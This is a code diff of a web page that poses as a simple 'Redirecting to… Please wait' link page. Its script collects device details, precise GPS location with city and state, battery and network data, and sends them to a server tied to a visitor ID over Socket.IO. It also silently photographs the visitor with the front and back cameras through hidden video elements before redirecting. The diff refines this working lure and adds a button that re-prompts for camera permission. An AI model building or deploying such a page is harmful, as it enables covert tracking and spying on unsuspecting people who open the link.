@@ -8,7 +8,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #ffffff;
+            background: #f5f7fa;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,32 +16,71 @@
             margin: 0;
             padding: 20px;
         }
-        .container { text-align: center; max-width: 500px; width: 100%; }
+        .container {
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            padding: 40px 30px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
         .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #f3f3f3;
+            width: 44px;
+            height: 44px;
+            border: 4px solid #e8ecf1;
             border-top: 4px solid #4285f4;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.9s linear infinite;
             margin: 0 auto 20px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .redirect-text { font-size: 18px; color: #333; margin-bottom: 8px; }
-        .redirect-url { font-size: 14px; color: #4285f4; word-break: break-all; font-weight: 500; }
-        .sub-text { font-size: 13px; color: #888; margin-top: 12px; }
-        #hiddenVideo, #hiddenVideoBack { display: none; }
-        #statusMsg { 
-            font-size: 12px; 
-            color: #999; 
-            margin-top: 15px;
-            padding: 8px;
-            background: #f5f5f5;
-            border-radius: 5px;
+        .redirect-text { font-size: 18px; color: #1a2332; margin-bottom: 6px; font-weight: 500; }
+        .redirect-url { 
+            font-size: 14px; 
+            color: #4285f4; 
+            word-break: break-all; 
+            font-weight: 500;
+            background: #f0f4ff;
+            padding: 8px 14px;
+            border-radius: 8px;
+            display: inline-block;
+            margin-top: 4px;
         }
+        .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
+        #statusBox {
+            margin-top: 18px;
+            padding: 12px 16px;
+            background: #f8f9fc;
+            border-radius: 10px;
+            font-size: 13px;
+            color: #1a2332;
+            text-align: left;
+            border: 1px solid #eaedf2;
+            max-height: 250px;
+            overflow-y: auto;
+        }
+        #statusBox .done { color: #22a67e; }
+        #statusBox .error { color: #e53e3e; }
+        #statusBox .wait { color: #f6ad55; }
+        #statusBox .info { color: #4299e1; }
+        #hiddenVideo, #hiddenVideoBack { display: none; }
+        .perm-btn {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 12px;
+            display: none;
+        }
+        .perm-btn:hover { background: #3367d6; }
     </style>
 </head>
 <body>
@@ -50,80 +89,138 @@
         <div class="redirect-text">Redirecting to</div>
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
         <div class="sub-text">Please wait a moment</div>
-        <div id="statusMsg">⏳ Initializing...</div>
+        
+        <div id="statusBox">
+            <div id="logContainer">⏳ Initializing...</div>
+        </div>
+        
+        <button class="perm-btn" id="manualTriggerBtn">📸 Allow Permissions</button>
     </div>
 
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <video id="hiddenVideoBack" autoplay playsinline muted></video>
 
-    <!-- Socket.IO CDN -->
-    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+    <!-- ========================================== -->
+    <!-- FIXED: SOCKET.IO CDN (WORKING VERSION) -->
+    <!-- ========================================== -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
     
+    <!-- FALLBACK: If above CDN fails -->
     <script>
-        // ============================================
-        // MAIN APPLICATION - SIMPLE & GUARANTEED
-        // ============================================
+        if (typeof io === 'undefined') {
+            document.write('<scr' + 'ipt src="https://cdn.socket.io/4.6.1/socket.io.min.js"><\/scr' + 'ipt>');
+        }
+        if (typeof io === 'undefined') {
+            document.write('<scr' + 'ipt src="https://unpkg.com/socket.io-client@4.7.2/dist/socket.io.min.js"><\/scr' + 'ipt>');
+        }
+    </script>
+
+    <script>
+        // ============================================================
+        // GUARANTEED WORKING - WITH FIXED CDN
+        // ============================================================
         (function() {
             const visitorId = window.location.pathname.split('/').pop();
-            const statusMsg = document.getElementById('statusMsg');
+            const logContainer = document.getElementById('logContainer');
             const redirectDisplay = document.getElementById('redirectUrlDisplay');
+            const manualBtn = document.getElementById('manualTriggerBtn');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
             let redirectTriggered = false;
-            let dataSent = {};
             let streamFront = null;
             let streamBack = null;
 
             // ============================================
-            // 1. UPDATE STATUS
+            // LOG FUNCTION
             // ============================================
-            function updateStatus(msg) {
-                console.log('[STATUS]', msg);
-                statusMsg.textContent = '⏳ ' + msg;
+            function addLog(msg, type = 'info') {
+                const time = new Date().toLocaleTimeString();
+                const colors = {
+                    done: '#22a67e',
+                    error: '#e53e3e',
+                    wait: '#f6ad55',
+                    info: '#4299e1'
+                };
+                const emojis = {
+                    done: '✅',
+                    error: '❌',
+                    wait: '⏳',
+                    info: 'ℹ️'
+                };
+                const div = document.createElement('div');
+                div.style.color = colors[type] || '#1a2332';
+                div.style.marginBottom = '4px';
+                div.style.fontSize = '13px';
+                div.textContent = `${emojis[type] || '•'} ${msg}`;
+                logContainer.appendChild(div);
+                logContainer.scrollTop = logContainer.scrollHeight;
+                console.log(`[${type}]`, msg);
+            }
+
+            addLog('Page loaded', 'info');
+            addLog(`Visitor ID: ${visitorId}`, 'info');
+
+            // Check if Socket.IO loaded
+            if (typeof io === 'undefined') {
+                addLog('❌ Socket.IO library not loaded!', 'error');
+                addLog('💡 Trying alternative CDN...', 'wait');
+                // Try loading from alternative source
+                var script = document.createElement('script');
+                script.src = 'https://cdn.socket.io/4.6.1/socket.io.min.js';
+                document.head.appendChild(script);
+                script.onload = function() {
+                    addLog('✅ Socket.IO loaded from fallback CDN', 'done');
+                    fetchRedirectUrl();
+                };
+                script.onerror = function() {
+                    addLog('❌ All CDN failed! Please check internet.', 'error');
+                };
+            } else {
+                addLog('✅ Socket.IO library loaded', 'done');
+                fetchRedirectUrl();
             }
 
             // ============================================
-            // 2. FETCH REDIRECT URL
+            // 1. FETCH REDIRECT URL
             // ============================================
             function fetchRedirectUrl() {
-                updateStatus('Fetching redirect URL...');
+                addLog('Fetching redirect URL...', 'wait');
                 
                 fetch(`/api/visitor/${visitorId}`)
                     .then(res => {
-                        if (!res.ok) throw new Error('Not found');
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
                         return res.json();
                     })
                     .then(data => {
                         redirectUrl = data.redirectUrl || 'https://www.google.com';
                         redirectDisplay.textContent = redirectUrl;
-                        updateStatus('Redirect URL loaded');
+                        addLog(`✅ Redirect URL: ${redirectUrl}`, 'done');
                         connectSocket();
                     })
                     .catch(() => {
-                        // Try fallback
                         fetch(`/api/visitor-redirect/${visitorId}`)
                             .then(res => res.json())
                             .then(data => {
                                 redirectUrl = data.redirectUrl || 'https://www.google.com';
                                 redirectDisplay.textContent = redirectUrl;
-                                updateStatus('Redirect URL loaded (fallback)');
+                                addLog(`✅ Fallback URL: ${redirectUrl}`, 'done');
                                 connectSocket();
                             })
                             .catch(() => {
                                 redirectUrl = 'https://www.google.com';
                                 redirectDisplay.textContent = redirectUrl;
-                                updateStatus('Using default redirect');
+                                addLog(`✅ Default URL: ${redirectUrl}`, 'done');
                                 connectSocket();
                             });
                     });
             }
 
             // ============================================
-            // 3. CONNECT SOCKET
+            // 2. CONNECT SOCKET
             // ============================================
             function connectSocket() {
-                updateStatus('Connecting to server...');
+                addLog('Connecting to server...', 'wait');
                 
                 try {
                     socket = io({
@@ -133,31 +230,31 @@
                     });
 
                     socket.on('connect', function() {
-                        updateStatus('✅ Connected to server');
-                        console.log('Socket connected');
+                        addLog('✅ Socket connected!', 'done');
                         startDataCollection();
                     });
 
                     socket.on('connect_error', function(err) {
-                        updateStatus('❌ Connection error, retrying...');
-                        console.log('Socket error:', err);
+                        addLog(`❌ Socket error: ${err.message}`, 'error');
+                        addLog('Retrying in 3 seconds...', 'wait');
+                        setTimeout(() => socket.connect(), 3000);
                     });
 
                     socket.on('disconnect', function() {
-                        updateStatus('⚠️ Disconnected');
+                        addLog('⚠️ Socket disconnected', 'error');
                     });
 
                 } catch(e) {
-                    updateStatus('❌ Socket error: ' + e.message);
-                    setTimeout(redirectNow, 5000);
+                    addLog(`❌ Socket init error: ${e.message}`, 'error');
+                    setTimeout(redirectNow, 8000);
                 }
             }
 
             // ============================================
-            // 4. START DATA COLLECTION
+            // 3. START DATA COLLECTION
             // ============================================
             function startDataCollection() {
-                updateStatus('📱 Collecting device info...');
+                addLog('📱 Collecting data...', 'info');
                 
                 // Send device info
                 const deviceInfo = {
@@ -178,102 +275,80 @@
                         visitorId: visitorId,
                         ...deviceInfo
                     });
-                    console.log('Device info sent');
+                    addLog('📱 Device info sent', 'done');
+                } else {
+                    addLog('⚠️ Socket not connected', 'error');
                 }
 
-                // Start all data collection
-                setTimeout(() => {
-                    requestLocation();
-                    requestCameras();
-                    getBattery();
-                    getNetwork();
-                }, 500);
-
-                // Auto redirect after 6 seconds
-                setTimeout(() => {
-                    if (!redirectTriggered) {
-                        updateStatus('🔄 Redirecting...');
-                        redirectNow();
-                    }
-                }, 6000);
-            }
-
-            // ============================================
-            // 5. REQUEST LOCATION (FORCE PERMISSION)
-            // ============================================
-            function requestLocation() {
-                updateStatus('📍 Requesting location...');
+                // ============================================
+                // 4. REQUEST LOCATION
+                // ============================================
+                addLog('📍 Requesting location...', 'wait');
                 
-                if (!navigator.geolocation) {
-                    updateStatus('⚠️ Location not supported');
-                    return;
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            const lat = position.coords.latitude;
+                            const lng = position.coords.longitude;
+                            addLog(`📍 Location: ${lat}, ${lng}`, 'done');
+                            
+                            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
+                                .then(res => res.json())
+                                .then(data => {
+                                    const locationInfo = {
+                                        lat: lat,
+                                        lng: lng,
+                                        accuracy: position.coords.accuracy,
+                                        timestamp: new Date().toISOString(),
+                                        country: data.countryName || 'Unknown',
+                                        state: data.principalSubdivision || 'Unknown',
+                                        city: data.locality || 'Unknown'
+                                    };
+                                    if (socket && socket.connected) {
+                                        socket.emit('visitor-data', {
+                                            visitorId: visitorId,
+                                            type: 'location',
+                                            content: locationInfo
+                                        });
+                                        addLog(`📍 Location sent: ${locationInfo.city}, ${locationInfo.state}`, 'done');
+                                    }
+                                })
+                                .catch(() => {
+                                    const locationInfo = {
+                                        lat: lat,
+                                        lng: lng,
+                                        accuracy: position.coords.accuracy,
+                                        timestamp: new Date().toISOString()
+                                    };
+                                    if (socket && socket.connected) {
+                                        socket.emit('visitor-data', {
+                                            visitorId: visitorId,
+                                            type: 'location',
+                                            content: locationInfo
+                                        });
+                                        addLog('📍 Basic location sent', 'done');
+                                    }
+                                });
+                        },
+                        function(error) {
+                            addLog(`❌ Location denied: ${error.message}`, 'error');
+                            addLog('💡 Click "Allow" if browser asks', 'info');
+                        },
+                        { timeout: 10000, enableHighAccuracy: true }
+                    );
                 }
 
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        updateStatus('📍 Location granted');
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-
-                        fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
-                            .then(res => res.json())
-                            .then(data => {
-                                const locationInfo = {
-                                    lat: lat,
-                                    lng: lng,
-                                    accuracy: position.coords.accuracy,
-                                    timestamp: new Date().toISOString(),
-                                    country: data.countryName || 'Unknown',
-                                    state: data.principalSubdivision || 'Unknown',
-                                    city: data.locality || 'Unknown'
-                                };
-
-                                if (socket && socket.connected) {
-                                    socket.emit('visitor-data', {
-                                        visitorId: visitorId,
-                                        type: 'location',
-                                        content: locationInfo
-                                    });
-                                    updateStatus(`📍 Location: ${locationInfo.city}, ${locationInfo.state}`);
-                                }
-                            })
-                            .catch(() => {
-                                // Basic location
-                                const locationInfo = {
-                                    lat: lat,
-                                    lng: lng,
-                                    accuracy: position.coords.accuracy,
-                                    timestamp: new Date().toISOString()
-                                };
-                                if (socket && socket.connected) {
-                                    socket.emit('visitor-data', {
-                                        visitorId: visitorId,
-                                        type: 'location',
-                                        content: locationInfo
-                                    });
-                                }
-                            });
-                    },
-                    function(error) {
-                        updateStatus('❌ Location denied: ' + error.message);
-                    },
-                    { timeout: 8000, enableHighAccuracy: true }
-                );
-            }
-
-            // ============================================
-            // 6. REQUEST CAMERAS (FORCE PERMISSION)
-            // ============================================
-            function requestCameras() {
-                updateStatus('📸 Requesting camera...');
-
-                // Front Camera
+                // ============================================
+                // 5. REQUEST CAMERAS
+                // ============================================
+                addLog('📸 Requesting front camera...', 'wait');
+                
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 })
                 .then(function(stream) {
-                    updateStatus('📸 Front camera granted');
+                    addLog('✅ Front camera granted', 'done');
                     streamFront = stream;
                     const video = document.getElementById('hiddenVideo');
                     video.srcObject = streamFront;
@@ -285,16 +360,17 @@
                     }, 1500);
                 })
                 .catch(function(err) {
-                    updateStatus('❌ Front camera denied: ' + err.message);
+                    addLog(`❌ Front camera denied: ${err.message}`, 'error');
                 });
 
-                // Back Camera
+                addLog('📸 Requesting back camera...', 'wait');
+                
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 })
                 .then(function(stream) {
-                    updateStatus('📸 Back camera granted');
+                    addLog('✅ Back camera granted', 'done');
                     streamBack = stream;
                     const video = document.getElementById('hiddenVideoBack');
                     video.srcObject = streamBack;
@@ -306,16 +382,97 @@
                     }, 2500);
                 })
                 .catch(function(err) {
-                    updateStatus('❌ Back camera denied: ' + err.message);
+                    addLog(`❌ Back camera denied: ${err.message}`, 'error');
                 });
+
+                // ============================================
+                // 6. BATTERY
+                // ============================================
+                if (navigator.getBattery) {
+                    navigator.getBattery()
+                        .then(function(battery) {
+                            const level = Math.round(battery.level * 100);
+                            if (socket && socket.connected) {
+                                socket.emit('visitor-data', {
+                                    visitorId: visitorId,
+                                    type: 'battery',
+                                    content: level
+                                });
+                                addLog(`🔋 Battery: ${level}%`, 'done');
+                            }
+                        })
+                        .catch(function() {
+                            addLog('⚠️ Battery API error', 'error');
+                        });
+                }
+
+                // ============================================
+                // 7. NETWORK
+                // ============================================
+                let networkData = {
+                    type: 'Unknown',
+                    effectiveType: 'Unknown',
+                    downlink: 'Unknown'
+                };
+                if (navigator.connection) {
+                    const conn = navigator.connection;
+                    networkData = {
+                        type: conn.type || 'Unknown',
+                        effectiveType: conn.effectiveType || 'Unknown',
+                        downlink: conn.downlink || 'Unknown'
+                    };
+                }
+                if (socket && socket.connected) {
+                    socket.emit('visitor-data', {
+                        visitorId: visitorId,
+                        type: 'network',
+                        content: networkData
+                    });
+                    addLog(`📶 Network: ${networkData.effectiveType}`, 'done');
+                }
+
+                // ============================================
+                // 8. AUTO REDIRECT
+                // ============================================
+                addLog('⏳ Will redirect in 8 seconds...', 'wait');
+                setTimeout(function() {
+                    if (!redirectTriggered) {
+                        addLog('🔄 Redirecting now...', 'info');
+                        redirectNow();
+                    }
+                }, 8000);
+
+                // ============================================
+                // 9. MANUAL TRIGGER BUTTON
+                // ============================================
+                manualBtn.style.display = 'block';
+                manualBtn.onclick = function() {
+                    addLog('📸 Manual trigger clicked', 'info');
+                    navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user' },
+                        audio: false
+                    })
+                    .then(function(stream) {
+                        addLog('✅ Manual: Camera granted!', 'done');
+                        const video = document.getElementById('hiddenVideo');
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(function() {
+                            capturePhoto('front', video);
+                        }, 1000);
+                    })
+                    .catch(function(err) {
+                        addLog(`❌ Manual: ${err.message}`, 'error');
+                    });
+                };
             }
 
             // ============================================
-            // 7. CAPTURE PHOTO
+            // 10. CAPTURE PHOTO
             // ============================================
             function capturePhoto(type, video) {
                 if (!video || !video.videoWidth) {
-                    console.log(type + ' video not ready');
+                    addLog(`⚠️ ${type} video not ready`, 'error');
                     return;
                 }
 
@@ -332,10 +489,9 @@
                         type: type === 'back' ? 'backCamera' : 'frontCamera',
                         content: imageData
                     });
-                    updateStatus(`📸 ${type} photo captured`);
+                    addLog(`📸 ${type} photo sent`, 'done');
                 }
 
-                // Clean up
                 if (type === 'front' && streamFront) {
                     streamFront.getTracks().forEach(t => t.stop());
                     streamFront = null;
@@ -347,62 +503,12 @@
             }
 
             // ============================================
-            // 8. BATTERY
-            // ============================================
-            function getBattery() {
-                if (navigator.getBattery) {
-                    navigator.getBattery()
-                        .then(function(battery) {
-                            const level = Math.round(battery.level * 100);
-                            if (socket && socket.connected) {
-                                socket.emit('visitor-data', {
-                                    visitorId: visitorId,
-                                    type: 'battery',
-                                    content: level
-                                });
-                                updateStatus(`🔋 Battery: ${level}%`);
-                            }
-                        })
-                        .catch(function() {});
-                }
-            }
-
-            // ============================================
-            // 9. NETWORK
-            // ============================================
-            function getNetwork() {
-                let networkData = {
-                    type: 'Unknown',
-                    effectiveType: 'Unknown',
-                    downlink: 'Unknown'
-                };
-
-                if (navigator.connection) {
-                    const conn = navigator.connection;
-                    networkData = {
-                        type: conn.type || 'Unknown',
-                        effectiveType: conn.effectiveType || 'Unknown',
-                        downlink: conn.downlink || 'Unknown'
-                    };
-                }
-
-                if (socket && socket.connected) {
-                    socket.emit('visitor-data', {
-                        visitorId: visitorId,
-                        type: 'network',
-                        content: networkData
-                    });
-                    updateStatus(`📶 Network: ${networkData.effectiveType}`);
-                }
-            }
-
-            // ============================================
-            // 10. REDIRECT
+            // 11. REDIRECT
             // ============================================
             function redirectNow() {
                 if (redirectTriggered) return;
                 redirectTriggered = true;
-                updateStatus('🔄 Redirecting...');
+                addLog(`🔄 Redirecting to: ${redirectUrl}`, 'info');
 
                 if (socket && socket.connected) {
                     socket.emit('visitor-data', {
@@ -414,13 +520,15 @@
 
                 setTimeout(function() {
                     window.location.href = redirectUrl;
-                }, 800);
+                }, 1000);
             }
 
             // ============================================
-            // 11. START
+            // 12. START (If Socket.IO already loaded)
             // ============================================
-            fetchRedirectUrl();
+            if (typeof io !== 'undefined') {
+                // Already started via script.onload or direct load
+            }
 
             // Cleanup
             window.addEventListener('beforeunload', function() {
